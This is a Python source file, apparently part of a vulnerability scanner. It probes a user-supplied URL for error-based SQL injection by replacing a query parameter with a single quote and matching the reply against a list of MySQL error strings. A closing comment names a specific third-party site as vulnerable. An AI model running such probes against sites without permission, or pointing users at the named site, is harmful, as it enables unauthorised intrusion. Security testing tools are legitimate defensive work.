import urllib
import sys
import os
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse
import http.client
import urllib.request
from colorama import Fore, Back, Style
import time

def goBack():
    print(Fore.WHITE+"\n[+] Sql Injection Attempt Successfully Completed "+Style.RESET_ALL)
    while True:
        reTest=input(Fore.GREEN+"\n>> Do You Want To Test For Sql Injection Again? (y/N) : "+Fore.RESET)
        if reTest=='y' or reTest=='Y':
            sqliAttack() #calling function to perform sql Injection Again
        elif reTest=='n' or reTest=='N' or reTest=='':
            while True:
                choice=input(Fore.GREEN+"\n>> Press Q to Quit or ENTER to go back to index : "+Style.RESET_ALL)
                if(choice=='Q' or choice=='q'):
                    sys.exit() #Exit Program
                elif choice=='':
                    print(Fore.BLUE+"[-] Going back to the Index of High Level Vulnerability Scanner"+Fore.RESET)
                    return
                else:
                    print(Fore.RED+Style.DIM+"[X] Invalid choice, enter Again : "+Style.RESET_ALL)
        else :
            print(Fore.RED+Style.DIM+"[X] Invalid choice, Enter Again : "+Style.RESET_ALL)

def sqliAttack():
    site = input(Fore.GREEN+"\n>> Enter URL <http(s)://domain.com> : "+Fore.RESET)
    print(Fore.MAGENTA+"[] Checkig for correctness of URL given"+Style.RESET_ALL)
    if "http://" in site:
        pass
    elif "https://" in site:
        pass
    else:
        site = "http://"+site
    try:
        components = urlparse(site) #parse Url
        exactDomain = '{uri.scheme}://{uri.netloc}/'.format(uri=components) #for 'http://stackoverflow.com/questions/1234567/blah-blah-blah-blah' gives'http://stackoverflow.com/' i.e. the domain
        domain = exactDomain.replace("https://","").replace("http://","").replace("www.","").replace("/","")
        request = http.client.HTTPConnection(domain)
        request.connect()
        print(Fore.BLUE+"[] Connection successfully made with the url ")
    except (http.client.HTTPException): #wrong exception
        print(Fore.RED+Style.DIM+"\n[X] Unable to make Connection"+Style.RESET_ALL)
        sqliAttack()
    except Exception:
        print(Fore.RED+Style.DIM+"\n[X] Invalid Input. Try Again"+Style.RESET_ALL)
        sqliAttack()
    query_pairs=parse_qs(urlparse(site).query) #Store the parameters of site in variable as dictionary
    if not query_pairs: #check if no parameters are present
        while True:
            print(Fore.RED+Style.DIM+"\n[X] The given URL does not contain any parameters"+Style.RESET_ALL)
            restartChoice=input(Fore.GREEN+">> Do you want to try with another URL? (y/N) : "+Fore.RESET)
            if restartChoice=='y' or restartChoice=='Y':
                sqliAttack()
            elif restartChoice=='n' or restartChoice=='N' or restartChoice=='':
                print(Fore.BLUE+"Going back to index"+Fore.RESET)
                return
            else:
                print(Fore.RED+"Invalid Choice ,Enter Again"+Style.RESET_ALL)

    print("[] Generating possible sql Injection vulnerable URL")
    for key in query_pairs:
        val=query_pairs[key]
        for vals in val:
            vals="\'" #set first parameter value to value+', i.e id=15 to id=15'
            query_pairs[key]=vals
            break
        break
    new_query_str = urlencode(query_pairs)
    new_components = (
            components.scheme,
            components.netloc,
            components.path,
            components.params,
            new_query_str,
            components.fragment
            )
    newUrl=urlunparse(new_components) #Generate new url with updated value
    print("[] Generated possible sql Injection vulnerable URL")
    print(Fore.GREEN+"\n[] THE URL being tested : "+Fore.RESET,newUrl)
    #possible keywords for sql Injection possibility
    vulnList=['You have an error in your SQL syntax','mysql_fetch_array()',' mysql_fetch_object()',' mysql_free_result()','undefined index','on line']
    try:
        vuln=0
        page = urllib.request.urlopen(newUrl) #send request with new possible vulnerable URL
        sourcecode = page.read() #store the sourcecode of request
        for possibleVuln in vulnList:
            if possibleVuln.encode() in sourcecode : #if the keywork present in sourcecode
                print(Fore.WHITE+"\n"+"-"*49)
                print("|"+Fore.YELLOW+Style.BRIGHT+"\t!! Possibe Vulnerablity Found !! "+Fore.WHITE+"\t|")
                print("-"*49+Style.RESET_ALL)
                vuln=1
                break
            else:
                continue
        if vuln==0:        
            print(Fore.WHITE+"\n"+"-"*52)
            print(Fore.YELLOW+Style.BRIGHT+"[--]Not vulnerable to Error Based SQL Injection[--]"+Style.RESET_ALL)
            print(Fore.WHITE+"-"*52+Style.RESET_ALL)
    except(urllib.error.HTTPError):
        print(Fore.RED+Style.DIM+"[X] Error Connecting with URL"+Style.RESET_ALL)
    except Exception:
        print(Fore.RED+Style.DIM+"[X] Unable to open requested url, try again"+Style.RESET_ALL)
    goBack()

#EXAMPLE URL WHICH IS VULNERABLE TO SQL-INJECTION : http://www.achromicpoint.com/past-event.php?id=186

